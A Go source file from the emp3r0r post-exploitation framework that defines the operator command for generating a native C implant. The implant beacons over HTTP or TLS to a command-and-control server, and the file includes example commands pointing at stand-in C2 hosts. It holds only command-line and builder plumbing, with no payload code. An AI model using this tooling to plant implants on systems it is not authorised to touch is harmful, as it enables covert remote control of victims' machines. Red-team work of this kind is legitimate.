package operator

import (
	"fmt"
	"strings"

	"github.com/carapace-sh/carapace"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// gen_c_cmd is the C agent's own generator. It is separate from
// `generate` because the C agent has a different target model: --type selects
// the libc ABI and --arch selects a C toolchain target, not a Go payload type.
func gen_c_cmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "generate_c",
		GroupID: "agent",
		Short:   "Generate the native C agent",
		Example: "generate_c --type glibc --arch amd64 --cc your.domain.com",
		Long: `Generate the native C agent.

The C agent implements http_poll only. With a bare --cc hostname it dials the
plain HTTP listener on --cc-http-port. With an explicit https:// URL it uses
TLS through the C2 TLS frontend or an external TLS front proxy. TLS requires
--transport libcurl (default) or --transport libssl; http_raw is plain HTTP
only. If the C2 certificate does not cover the new name, the server adds it
there and reloads the certificate for new TLS/QUIC handshakes.

Examples:
  generate_c --cc c2.example.com --type glibc --arch amd64
  generate_c --cc https://front.example.com --type glibc --arch amd64 --transport libssl
  generate_c --cc https://c2.example.com:8443 --type glibc --arch amd64 --transport libcurl`,
		Run: CmdGenerateCAgent,
	}

	cmd.Flags().StringP("type", "t", builder.CAgentLibcs[0], fmt.Sprintf("C library variant, available: %v", builder.CAgentLibcs))
	cmd.Flags().StringP("arch", "a", builder.CAgentArches[0], fmt.Sprintf("Target architecture, available: %v", builder.CAgentArches))
	cmd.Flags().String("cc", defaultC2Address(), "C2 hostname, or an explicit http(s) URL for TLS (Required)")
	cmd.Flags().String("cc-http-port", live.RuntimeConfig.CCHTTPPort, "Port for HTTP Polling/Beaconing C2 transport")
	cmd.Flags().String("doh", "", "DNS over HTTPS resolver URL. Example: https://1.1.1.1/dns-query")

	cmd.Flags().String("crypto", builder.CAgentCryptoProviders[0], fmt.Sprintf("Crypto provider. Available: %v", builder.CAgentCryptoProviders))
	cmd.Flags().String("format", builder.CAgentFormats[0], fmt.Sprintf("Output format. Available: %v", builder.CAgentFormats))
	cmd.Flags().String("gzip", builder.CAgentGzipProviders[0], fmt.Sprintf("Compression provider. Available: %v", builder.CAgentGzipProviders))
	cmd.Flags().String("transport", builder.CAgentTransportProviders[0], fmt.Sprintf("Transport provider. Available: %v", builder.CAgentTransportProviders))
	cmd.Flags().String("dynload", builder.CAgentDynloadModes[0], fmt.Sprintf("libc dynamic-loader symbols. Available: %v", builder.CAgentDynloadModes))
	cmd.Flags().String("glibc-version", builder.CAgentGlibcVersions[0], fmt.Sprintf("Oldest glibc ABI to link against. Available: %v", builder.CAgentGlibcVersions))

	cmd.MarkFlagRequired("cc")

	carapace.Gen(cmd).FlagCompletion(carapace.ActionMap{
		"type":          carapace.ActionValues(builder.CAgentLibcs...),
		"arch":          carapace.ActionValues(builder.CAgentArches...),
		"cc":            carapace.ActionValues(c2AddressCompletions()...),
		"cc-http-port":  carapace.ActionValues(c2PortCompletions()...),
		"doh":           carapace.ActionValues("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query", "https://9.9.9.9/dns-query"),
		"crypto":        carapace.ActionValues(builder.CAgentCryptoProviders...),
		"format":        carapace.ActionValues(builder.CAgentFormats...),
		"gzip":          carapace.ActionValues(builder.CAgentGzipProviders...),
		"transport":     carapace.ActionValues(builder.CAgentTransportProviders...),
		"dynload":       carapace.ActionValues(builder.CAgentDynloadModes...),
		"glibc-version": carapace.ActionValues(builder.CAgentGlibcVersions...),
	})
	return cmd
}

// CmdGenerateCAgent builds the native C agent. --type is the libc variant and
// --arch is the C toolchain target, so these flags cannot collide with the Go
// agent generator's payload type and Go architecture.
func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
	libc := flagString(cmd, "type")
	dynload := cAgentDynloadForLibc(libc, flagString(cmd, "dynload"), cmd.Flags().Changed("dynload"))
	// The C agent implements only the http_poll channel mode, so it is fixed
	// rather than exposed as a flag that would produce a non-working agent.
	channelMode := def.C2ChannelModeDefault
	opts := builder.AgentConfig{
		CCAddress:     getStringOptPtr(cmd, "cc"),
		CCHTTPPort:    getStringOptPtr(cmd, "cc-http-port"),
		DoHServer:     getStringOptPtr(cmd, "doh"),
		C2ChannelMode: &channelMode,
	}
	providers := builder.CAgentProviders{
		Crypto:    flagString(cmd, "crypto"),
		Gzip:      flagString(cmd, "gzip"),
		Transport: flagString(cmd, "transport"),
		Dynload:   dynload,
		Glibc:     flagString(cmd, "glibc-version"),
		Libc:      libc,
		Arch:      flagString(cmd, "arch"),
		Format:    flagString(cmd, "format"),
	}

	res, err := builder.GenerateCAgentWorkflow(opts, providers, client.SignAgent)
	if err != nil {
		logging.Errorf("Failed to generate C agent: %v", err)
		return
	}

	logging.Successf("Generated C agent: %s", res.OutputFile)
	logging.Infof("C agent UUID: %s", util.AgentRef(res.AgentUUID))
	logging.Infof("Config payload: %d bytes, encrypted with the C2 MagicString", res.ConfigSize)
	endpoint := cAgentEndpoint(live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort)
	logging.Infof("C agent transport: channel=http_poll transport=%s endpoint=%s",
		providers.Transport, endpoint)
	if strings.HasPrefix(endpoint, "https://") && providers.Transport == "http_raw" {
		logging.Warningf("http_raw does not support TLS; use --transport libcurl or --transport libssl")
	}
}

func flagString(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

// cAgentDynloadForLibc follows the selected libc when the operator did not pick
// a dynload mode. The --dynload default targets glibc, but musl only exports
// the public dl* names, so an unset mode becomes public for a musl build rather
// than failing validation on the glibc default.
func cAgentDynloadForLibc(libc, dynload string, dynloadSet bool) string {
	if libc == "musl" && !dynloadSet {
		return "public"
	}
	return dynload
}

// cAgentEndpoint describes the URL baked into the C agent. An explicit URL
// carries its own scheme and port; a bare host uses the plain HTTP port.
func cAgentEndpoint(cc, httpPort string) string {
	cc = strings.TrimSuffix(cc, "/")
	if strings.Contains(cc, "://") {
		return cc
	}
	return fmt.Sprintf("http://%s:%s", cc, httpPort)
}
